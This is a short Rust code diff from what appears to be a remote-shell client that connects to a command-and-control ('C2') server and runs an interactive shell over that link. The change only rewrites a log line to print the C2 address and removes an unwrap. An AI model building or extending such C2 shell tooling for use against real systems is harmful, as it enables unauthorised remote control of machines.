@@ -23,7 +23,7 @@ async fn get_connection(settings: &Settings) -> Result<Arc<Mutex<dyn ProtoConnec
         };
 
         if let Ok(conn) = conn {
-            debug!("Got connection: {conn:?}");
+            info!("Connected to C2 at: {:?}", conn.lock().await.remote_addr()?);
             return Ok(conn);
         }
     }
@@ -49,9 +49,7 @@ async fn main() -> Result<(), RastError> {
     };
 
     let connection = get_connection(&conf).await?;
-
-    let state = ShellState::new(connection.unwrap());
-
+    let state = ShellState::new(connection);
     let mut shell = get_shell(state);
 
     shell.run_async().await?;
